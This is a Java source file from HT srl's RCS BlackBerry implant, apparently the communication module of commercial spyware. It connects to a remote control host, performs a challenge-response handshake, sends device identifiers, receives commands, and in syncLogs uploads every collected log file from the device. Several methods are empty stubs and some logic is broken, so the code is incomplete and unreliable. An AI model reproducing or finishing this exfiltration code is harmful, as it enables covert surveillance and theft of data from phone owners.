/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Transfer.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.transfer;

import java.io.IOException;
import java.util.Random;
import java.util.Vector;

import net.rim.device.api.util.DataBuffer;

import com.ht.rcs.blackberry.AgentManager;
import com.ht.rcs.blackberry.Common;
import com.ht.rcs.blackberry.fs.AutoFlashFile;
import com.ht.rcs.blackberry.log.Log;
import com.ht.rcs.blackberry.log.LogCollector;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class Transfer.
 */
public class Transfer {

	/** The debug. */
	private static Debug debug = new Debug("Transfer", DebugLevel.VERBOSE);

	/** The Constant instance_. */
	private final static Transfer instance_ = new Transfer();

	LogCollector logCollector;

	String host_ = "";
	int port_ = 0;

	boolean wifi_preferred_;
	boolean wifi = false;
	boolean connected = false;

	Connection connection = null;

	byte[] challenge = new byte[16];

	/**
	 * Instantiates a new transfer.
	 */
	private Transfer() {
		logCollector = LogCollector.getInstance();
	}

	/**
	 * Gets the single instance of Transfer.
	 * 
	 * @return single instance of Transfer
	 */
	public static Transfer getInstance() {
		return instance_;
	}

	void init(String host, int port, boolean wifi_preferred) {
		host_ = host;
		port_ = port;
		wifi_preferred_ = wifi_preferred;
	}

	public synchronized boolean send() {
		if (!connect()) {
			debug.error("not connected");
			return false;
		}

		try{
			//challenge response 
			sendChallenge();
			getResponse();
			
			getChallenge();
			sendResponse();
			
			// identificazione
			sendIds();
			
			// ricezione configurazione o comandi
			for(;;)
			{
				int command = recvCommand();
				if(!parseCommand(command))
					break;
			}		
			
		}catch(ProtocolException ex)
		{
			debug.error("protocol exception");
			return false;
		}finally
		{
			disconnect();
		}
					
	}

	private boolean parseCommand(int command) {
		// TODO Auto-generated method stub
		return false;
	}

	private void sendIds() {
		// TODO Auto-generated method stub
		
	}

	private void sendResponse() {
		// TODO Auto-generated method stub
		
	}

	private void getChallenge() {
		// TODO Auto-generated method stub
		
	}

	private void getResponse() {
		
	}

	private void sendChallenge() throws ProtocolException {
		// TODO: keep a log seed
		Random random = new Random();

		for (int i = 0; i < 16; i++) {
			challenge[i] = (byte) random.nextInt();
		}

		if(! sendCommand(Proto.CHALLENGE, challenge))
		{
			throw new ProtocolException();
		}
	}
	

	public synchronized void syncLogs() throws ProtocolException {

		debug.info("connected: " + connected + " wifi: " + wifi);

		// snap dei log

		Vector logs = logCollector.getLogs();
		for (int i = 0; i < logs.size(); i++) {
			String logName = (String) logs.elementAt(i);
			AutoFlashFile file = new AutoFlashFile(logName, false);
			byte[] content = file.read();
			boolean ret = sendCommand(Proto.SYNC, content);

		}

		//connection.disconnect();
	}

	private void disconnect() {
		if (connected) {
			connected = false;
			sendCommand(Proto.BYE);
			connection.disconnect();
			connection = null;
		}
	}

	private boolean sendCommand(int command) {
		return sendCommand(command, null);
	}

	private boolean sendCommand(int command, byte[] payload) {

		int payLen = 0;
		if (payload != null) {
			payLen = payload.length;
		}

		byte[] data = new byte[payLen + 4];
		DataBuffer databuffer = new DataBuffer(data, 0, data.length, false);

		databuffer.writeInt(command);
		if (payload != null) {
			debug.trace("payload null");
			databuffer.write(payload);
		}

		Check.ensures(payLen + 4 == data.length, "wrong length");

		try {
			return connection.send(data);
		} catch (IOException e) {
			return false;
		}
	}

	private int recvCommand() {
		//int command = Proto.
		
		return 0;
	}
	

	private boolean connect() {
		if(connected)
		{			
			debug.error("Already connected");
			Check.asserts(connection != null, "connection null");
			return true;
		}
		
		wifi = false;
		if (wifi_preferred_) {
			debug.trace("Try wifi");
			connection = new WifiConnection(host_, port_);
			if( connection.isActive())
			{
				wifi = true;
				connected = connection.connect();
			}
		}

		// fall back
		if (!wifi || !connected) {
			debug.trace("Try direct tcp");
			connection = new DirectTcpConnection(host_, port_);
			connected = connection.connect();
		}

		if (connection == null) {
			debug.error("null connection");
			return false;
		}
		
		debug.info("connected: "+connected);
		return connected;

	}
}
